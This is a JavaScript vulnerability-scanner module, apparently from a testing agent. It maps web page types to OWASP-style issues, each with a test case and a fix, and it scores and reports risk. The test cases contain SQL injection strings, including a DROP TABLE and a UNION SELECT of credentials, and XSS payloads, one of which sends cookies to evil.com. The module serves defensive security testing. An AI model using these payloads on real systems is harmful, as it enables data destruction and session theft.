/**
 * Yali Agent - Vulnerability Scanner
 * Ported from testai-agent/security/vulnerability_scanner.py
 *
 * Identifies potential security vulnerabilities based on page type.
 * Uses OWASP Top 10 2021 + common vulnerability patterns.
 */

/**
 * Vulnerability types (OWASP Top 10 2021 + common)
 */
const VulnerabilityType = {
  // OWASP Top 10 2021
  BROKEN_ACCESS_CONTROL: 'A01:2021-Broken Access Control',
  CRYPTOGRAPHIC_FAILURES: 'A02:2021-Cryptographic Failures',
  INJECTION: 'A03:2021-Injection',
  INSECURE_DESIGN: 'A04:2021-Insecure Design',
  SECURITY_MISCONFIGURATION: 'A05:2021-Security Misconfiguration',
  VULNERABLE_COMPONENTS: 'A06:2021-Vulnerable Components',
  AUTH_FAILURES: 'A07:2021-Auth Failures',
  DATA_INTEGRITY_FAILURES: 'A08:2021-Data Integrity Failures',
  LOGGING_FAILURES: 'A09:2021-Logging Failures',
  SSRF: 'A10:2021-SSRF',

  // Common additional
  XSS: 'XSS',
  CSRF: 'CSRF',
  SQL_INJECTION: 'SQL Injection',
  SENSITIVE_DATA_EXPOSURE: 'Sensitive Data Exposure',
  SESSION_MANAGEMENT: 'Session Management',
  INPUT_VALIDATION: 'Input Validation'
}

/**
 * Severity levels
 */
const SeverityLevel = {
  CRITICAL: 'critical',
  HIGH: 'high',
  MEDIUM: 'medium',
  LOW: 'low',
  INFO: 'info'
}

/**
 * Pre-defined vulnerabilities by page type
 */
const VULNERABILITY_MAP = {
  login: [
    {
      type: VulnerabilityType.SQL_INJECTION,
      title: 'SQL Injection in Login Form',
      severity: SeverityLevel.CRITICAL,
      description: 'Login forms are prime targets for SQL injection attacks attempting to bypass authentication.',
      testCase: "Enter ' OR '1'='1 in username/email field and submit",
      recommendation: 'Use parameterized queries and input validation. Never construct SQL with user input.'
    },
    {
      type: VulnerabilityType.XSS,
      title: 'Reflected XSS in Login Error',
      severity: SeverityLevel.HIGH,
      description: 'Error messages displaying user input may be vulnerable to XSS.',
      testCase: "Enter <script>alert('XSS')</script> as username and check error message",
      recommendation: 'Sanitize all user input before displaying. Use Content Security Policy.'
    },
    {
      type: VulnerabilityType.AUTH_FAILURES,
      title: 'Brute Force Attack Vulnerability',
      severity: SeverityLevel.CRITICAL,
      description: 'Lack of rate limiting allows automated password guessing attacks.',
      testCase: 'Attempt 10+ rapid login failures and check if account locks or rate limiting triggers',
      recommendation: 'Implement account lockout, progressive delays, and CAPTCHA after failures.'
    },
    {
      type: VulnerabilityType.SESSION_MANAGEMENT,
      title: 'Session Fixation',
      severity: SeverityLevel.HIGH,
      description: 'Session ID not regenerated after login allows session fixation attacks.',
      testCase: 'Note session ID before login, login, verify session ID changed',
      recommendation: 'Always regenerate session ID after successful authentication.'
    },
    {
      type: VulnerabilityType.CSRF,
      title: 'Missing CSRF Token',
      severity: SeverityLevel.HIGH,
      description: 'Login form without CSRF protection allows cross-site request forgery.',
      testCase: 'Inspect form for CSRF token. Try submitting from external origin.',
      recommendation: 'Include unique CSRF token in all state-changing forms.'
    },
    {
      type: VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
      title: 'Password in URL Parameters',
      severity: SeverityLevel.CRITICAL,
      description: 'Passwords sent via GET parameters are logged in browser history and server logs.',
      testCase: 'Check network request - password should only be in POST body',
      recommendation: 'Always use POST for login forms. Never include passwords in URLs.'
    },
    {
      type: VulnerabilityType.AUTH_FAILURES,
      title: 'Username Enumeration',
      severity: SeverityLevel.MEDIUM,
      description: 'Different error messages for invalid username vs password reveal valid accounts.',
      testCase: 'Try invalid username, note error. Try valid username with wrong password, compare errors.',
      recommendation: 'Use generic error message: "Invalid username or password"'
    }
  ],

  signup: [
    {
      type: VulnerabilityType.SQL_INJECTION,
      title: 'SQL Injection in Registration',
      severity: SeverityLevel.CRITICAL,
      description: 'Registration forms inserting user data are vulnerable to SQL injection.',
      testCase: "Enter '; DROP TABLE users;-- in any text field",
      recommendation: 'Use parameterized queries for all database operations.'
    },
    {
      type: VulnerabilityType.XSS,
      title: 'Stored XSS via Profile Data',
      severity: SeverityLevel.HIGH,
      description: 'User-provided data stored and displayed elsewhere can execute malicious scripts.',
      testCase: "Register with name: <script>alert('XSS')</script>, view profile elsewhere",
      recommendation: 'Sanitize all user input on storage and encode on output.'
    },
    {
      type: VulnerabilityType.INPUT_VALIDATION,
      title: 'Weak Password Allowed',
      severity: SeverityLevel.MEDIUM,
      description: 'Accepting weak passwords puts user accounts at risk.',
      testCase: "Try registering with password '123456' or 'password'",
      recommendation: 'Enforce minimum 8 chars with complexity requirements. Check against breached password lists.'
    },
    {
      type: VulnerabilityType.INSECURE_DESIGN,
      title: 'Email Verification Bypass',
      severity: SeverityLevel.HIGH,
      description: 'Accounts accessible before email verification allows fake account creation.',
      testCase: 'Register with invalid email, check if account is fully functional',
      recommendation: 'Require email verification before granting full account access.'
    }
  ],

  checkout: [
    {
      type: VulnerabilityType.CRYPTOGRAPHIC_FAILURES,
      title: 'Payment Data Not Encrypted',
      severity: SeverityLevel.CRITICAL,
      description: 'Credit card data transmitted or stored without encryption violates PCI-DSS.',
      testCase: 'Inspect network requests for card data. Should be HTTPS only.',
      recommendation: 'Use HTTPS everywhere. Use tokenization for payment data. Never store CVV.'
    },
    {
      type: VulnerabilityType.BROKEN_ACCESS_CONTROL,
      title: 'Price Manipulation',
      severity: SeverityLevel.CRITICAL,
      description: 'Client-side price data can be modified before submission.',
      testCase: 'Intercept checkout request, modify price values, check if accepted',
      recommendation: 'Never trust client-provided prices. Calculate totals server-side.'
    },
    {
      type: VulnerabilityType.CSRF,
      title: 'CSRF on Checkout',
      severity: SeverityLevel.CRITICAL,
      description: 'Missing CSRF protection allows attackers to initiate purchases.',
      testCase: 'Create external page that submits to checkout endpoint',
      recommendation: 'Require CSRF token for all checkout operations.'
    },
    {
      type: VulnerabilityType.DATA_INTEGRITY_FAILURES,
      title: 'Double Payment Vulnerability',
      severity: SeverityLevel.CRITICAL,
      description: 'Lack of idempotency allows duplicate charges on retry/refresh.',
      testCase: 'Submit payment, quickly click submit again or refresh',
      recommendation: 'Use idempotency keys. Disable submit button after first click.'
    },
    {
      type: VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
      title: 'Card Data in Logs',
      severity: SeverityLevel.CRITICAL,
      description: 'Payment card data logged in server or application logs.',
      testCase: 'Review server logs after checkout. No card numbers should appear.',
      recommendation: 'Configure logging to mask sensitive data. Use PCI-compliant logging.'
    }
  ],

  search: [
    {
      type: VulnerabilityType.SQL_INJECTION,
      title: 'SQL Injection in Search',
      severity: SeverityLevel.CRITICAL,
      description: 'Search queries often directly used in SQL WHERE clauses.',
      testCase: "Search for: ' UNION SELECT username, password FROM users--",
      recommendation: 'Use parameterized queries. Sanitize search input.'
    },
    {
      type: VulnerabilityType.XSS,
      title: 'Reflected XSS in Search Results',
      severity: SeverityLevel.HIGH,
      description: 'Search term displayed in results page may execute scripts.',
      testCase: "Search for: <script>document.location='http://evil.com?c='+document.cookie</script>",
      recommendation: 'Encode all user input in HTML output. Use Content Security Policy.'
    },
    {
      type: VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
      title: 'Information Disclosure via Search',
      severity: SeverityLevel.MEDIUM,
      description: 'Search may expose data user should not have access to.',
      testCase: 'Search for sensitive terms. Check if unauthorized data appears.',
      recommendation: 'Apply access control to search results. Filter based on user permissions.'
    }
  ],

  profile: [
    {
      type: VulnerabilityType.BROKEN_ACCESS_CONTROL,
      title: 'IDOR on Profile',
      severity: SeverityLevel.CRITICAL,
      description: 'Changing user ID in URL/request allows access to other profiles.',
      testCase: 'View your profile, change user ID in URL/request, check if other profile loads',
      recommendation: 'Verify user authorization for every profile access.'
    },
    {
      type: VulnerabilityType.XSS,
      title: 'Stored XSS in Profile Fields',
      severity: SeverityLevel.HIGH,
      description: 'Profile data displayed to other users can contain malicious scripts.',
      testCase: "Set bio to: <img src=x onerror=alert('XSS')>, view from another account",
      recommendation: 'Sanitize all profile fields on input and encode on output.'
    },
    {
      type: VulnerabilityType.CSRF,
      title: 'CSRF on Profile Update',
      severity: SeverityLevel.HIGH,
      description: 'Profile changes without CSRF token allow unauthorized modifications.',
      testCase: 'Create external form that submits profile update',
      recommendation: 'Require CSRF token for all profile modifications.'
    },
    {
      type: VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
      title: 'Sensitive Data in API Response',
      severity: SeverityLevel.MEDIUM,
      description: 'API may return more user data than displayed in UI.',
      testCase: 'Inspect API response for profile. Check for hidden sensitive fields.',
      recommendation: 'Only return necessary fields in API. Never expose passwords/tokens.'
    }
  ],

  settings: [
    {
      type: VulnerabilityType.BROKEN_ACCESS_CONTROL,
      title: 'Unauthorized Settings Access',
      severity: SeverityLevel.HIGH,
      description: 'Settings pages may be accessible without proper authentication.',
      testCase: 'Try accessing settings URL without being logged in',
      recommendation: 'Require authentication for all settings pages.'
    },
    {
      type: VulnerabilityType.CSRF,
      title: 'CSRF on Settings Change',
      severity: SeverityLevel.HIGH,
      description: 'Settings changes without CSRF protection allow unauthorized changes.',
      testCase: 'Create external form that changes email/password settings',
      recommendation: 'Require CSRF token and re-authentication for sensitive changes.'
    }
  ]
}

/**
 * Create a vulnerability finding
 */
function createVulnerability(type, title, severity, description, testCase, recommendation) {
  return {
    id: `VULN_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
    type,
    title,
    severity,
    description,
    testCase,
    recommendation,
    timestamp: new Date().toISOString()
  }
}

/**
 * Create a scan result
 */
function createScanResult(pageType, vulnerabilities) {
  const counts = {
    [SeverityLevel.CRITICAL]: 0,
    [SeverityLevel.HIGH]: 0,
    [SeverityLevel.MEDIUM]: 0,
    [SeverityLevel.LOW]: 0,
    [SeverityLevel.INFO]: 0
  }

  for (const v of vulnerabilities) {
    counts[v.severity]++
  }

  // Calculate risk score (0-100)
  const riskScore = Math.min(100,
    counts[SeverityLevel.CRITICAL] * 25 +
    counts[SeverityLevel.HIGH] * 15 +
    counts[SeverityLevel.MEDIUM] * 8 +
    counts[SeverityLevel.LOW] * 3 +
    counts[SeverityLevel.INFO] * 1
  )

  return {
    pageType,
    vulnerabilities,
    counts,
    riskScore,
    totalCount: vulnerabilities.length,
    timestamp: new Date().toISOString(),

    getBySeverity(severity) {
      return vulnerabilities.filter(v => v.severity === severity)
    },

    getByType(type) {
      return vulnerabilities.filter(v => v.type === type)
    },

    getSummary() {
      const lines = []
      lines.push(`Security Scan: ${pageType}`)
      lines.push('='.repeat(40))
      lines.push(`Risk Score: ${riskScore}/100`)
      lines.push(`Total Issues: ${vulnerabilities.length}`)
      lines.push('')
      lines.push(`ðŸ”´ Critical: ${counts[SeverityLevel.CRITICAL]}`)
      lines.push(`ðŸŸ  High: ${counts[SeverityLevel.HIGH]}`)
      lines.push(`ðŸŸ¡ Medium: ${counts[SeverityLevel.MEDIUM]}`)
      lines.push(`ðŸŸ¢ Low: ${counts[SeverityLevel.LOW]}`)
      lines.push(`â„¹ï¸ Info: ${counts[SeverityLevel.INFO]}`)
      return lines.join('\n')
    }
  }
}

/**
 * Vulnerability Scanner class
 */
class VulnerabilityScanner {
  constructor() {
    this.customRules = []
  }

  /**
   * Scan a page type for vulnerabilities
   */
  scan(pageType, elements = []) {
    const vulnerabilities = []

    // Get pre-defined vulnerabilities for page type
    const pageVulns = VULNERABILITY_MAP[pageType] || VULNERABILITY_MAP.profile

    for (const v of pageVulns) {
      vulnerabilities.push(createVulnerability(
        v.type,
        v.title,
        v.severity,
        v.description,
        v.testCase,
        v.recommendation
      ))
    }

    // Analyze elements for additional vulnerabilities
    const elementVulns = this._analyzeElements(elements, pageType)
    vulnerabilities.push(...elementVulns)

    // Apply custom rules
    for (const rule of this.customRules) {
      if (rule.appliesTo(pageType, elements)) {
        vulnerabilities.push(createVulnerability(
          rule.type,
          rule.title,
          rule.severity,
          rule.description,
          rule.testCase,
          rule.recommendation
        ))
      }
    }

    return createScanResult(pageType, vulnerabilities)
  }

  /**
   * Analyze page elements for vulnerabilities
   */
  _analyzeElements(elements, pageType) {
    const vulns = []

    const inputs = elements.filter(e => e.category === 'text-input' || e.tag === 'input')
    const forms = elements.filter(e => e.tag === 'form')

    // Check for password fields without autocomplete=off
    const passwordFields = inputs.filter(e => e.type === 'password')
    if (passwordFields.length > 0) {
      vulns.push(createVulnerability(
        VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
        'Password Field Autocomplete',
        SeverityLevel.LOW,
        'Password fields may allow browser autocomplete, exposing credentials.',
        'Check if password field has autocomplete="off" or "new-password"',
        'Add autocomplete="new-password" to password fields.'
      ))
    }

    // Check for forms without HTTPS
    // (In real app, would check actual form action URLs)

    // Check for hidden fields that might contain sensitive data
    const hiddenInputs = inputs.filter(e => e.type === 'hidden')
    if (hiddenInputs.length > 0) {
      vulns.push(createVulnerability(
        VulnerabilityType.SENSITIVE_DATA_EXPOSURE,
        'Hidden Form Fields',
        SeverityLevel.INFO,
        'Hidden fields may contain sensitive data visible in page source.',
        'Inspect hidden fields for sensitive values like tokens, IDs, or prices',
        'Avoid storing sensitive data in hidden fields. Use server-side sessions.'
      ))
    }

    return vulns
  }

  /**
   * Add a custom vulnerability rule
   */
  addCustomRule(rule) {
    this.customRules.push(rule)
  }

  /**
   * Format a detailed report
   */
  formatReport(scanResult, showRecommendations = true) {
    const lines = []

    lines.push('# Security Vulnerability Report')
    lines.push(`**Page Type:** ${scanResult.pageType}`)
    lines.push(`**Risk Score:** ${scanResult.riskScore}/100`)
    lines.push(`**Scanned:** ${scanResult.timestamp}`)
    lines.push('')

    // Critical first
    const critical = scanResult.getBySeverity(SeverityLevel.CRITICAL)
    if (critical.length > 0) {
      lines.push('## ðŸ”´ Critical Vulnerabilities')
      for (const v of critical) {
        lines.push(`### ${v.title}`)
        lines.push(`**Type:** ${v.type}`)
        lines.push(`**Description:** ${v.description}`)
        lines.push(`**Test Case:** ${v.testCase}`)
        if (showRecommendations) {
          lines.push(`**Recommendation:** ${v.recommendation}`)
        }
        lines.push('')
      }
    }

    // High
    const high = scanResult.getBySeverity(SeverityLevel.HIGH)
    if (high.length > 0) {
      lines.push('## ðŸŸ  High Severity')
      for (const v of high) {
        lines.push(`- **${v.title}**: ${v.description}`)
        if (showRecommendations) {
          lines.push(`  - *Fix:* ${v.recommendation}`)
        }
      }
      lines.push('')
    }

    // Medium and lower summarized
    const mediumLow = [
      ...scanResult.getBySeverity(SeverityLevel.MEDIUM),
      ...scanResult.getBySeverity(SeverityLevel.LOW)
    ]
    if (mediumLow.length > 0) {
      lines.push('## ðŸŸ¡ Medium/Low Severity')
      for (const v of mediumLow) {
        lines.push(`- ${v.title} (${v.severity})`)
      }
    }

    return lines.join('\n')
  }

  /**
   * Get vulnerability types relevant to a page type
   */
  getRelevantTypes(pageType) {
    const vulns = VULNERABILITY_MAP[pageType] || []
    return [...new Set(vulns.map(v => v.type))]
  }
}

/**
 * Quick vulnerability scan
 */
function quickScan(pageType, elements = []) {
  const scanner = new VulnerabilityScanner()
  return scanner.scan(pageType, elements)
}

module.exports = {
  VulnerabilityType,
  SeverityLevel,
  VULNERABILITY_MAP,
  VulnerabilityScanner,
  createVulnerability,
  createScanResult,
  quickScan
}
